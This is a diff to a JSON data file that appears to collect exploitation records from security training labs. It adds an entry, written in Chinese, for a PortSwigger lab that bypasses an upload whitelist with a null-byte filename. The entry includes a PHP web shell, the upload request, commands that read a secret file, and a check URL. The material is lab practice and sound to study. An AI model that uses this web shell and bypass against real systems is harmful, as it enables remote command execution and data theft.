@@ -45,5 +45,17 @@
       "url": "http://localhost:8084/xvwa/img/uploads/{payload}",
       "match": "XVWA_PWNED_49"
     }
+  },
+  {
+    "id": "auto-20261030231819",
+    "context": "PortSwigger mystery lab。avatar 上传点 /my-account/avatar 扩展名白名单仅允许 .jpg/.png（报错 \"only JPG & PNG files are allowed\"）。双扩展名 shell.php.jpg 能上传但被当静态文件不解析；.PHP 大小写也被拒。用文件名 null byte 截断绕过白名单：filename=shell.php%00.jpg，服务端截断后存为 shell.php，PHP 解析执行。",
+    "reference_payload": "POST /my-account/avatar multipart: user=wiener, csrf=..., avatar=@shell.php;filename=\"shell.php%00.jpg\";type=image/jpeg  (内容 <?php echo \"SECCHECK\"; system($_GET[\"cmd\"]); ?>) → 访问 /files/avatars/shell.php?cmd=id 返回 uid=12002(carlos)，cmd=cat /home/carlos/secret 得到 secret，提交 /submitSolution answer=secret 得 {\"correct\":true}",
+    "principle": "扩展名白名单校验被 null byte 截断绕过：校验层看到 .jpg 通过，文件系统写入时停在 \\x00 存成 .php，后端 PHP 引擎解析该扩展名执行任意命令",
+    "source": "portswigger",
+    "evidence": {
+      "verify": "echo",
+      "url": "https://0a1a00f70312b3a6809d8a2b00d400b3.web-security-academy.net/files/avatars/shell.php?cmd=echo%20SECCHECK",
+      "match": "SECCHECK"
+    }
   }
 ]
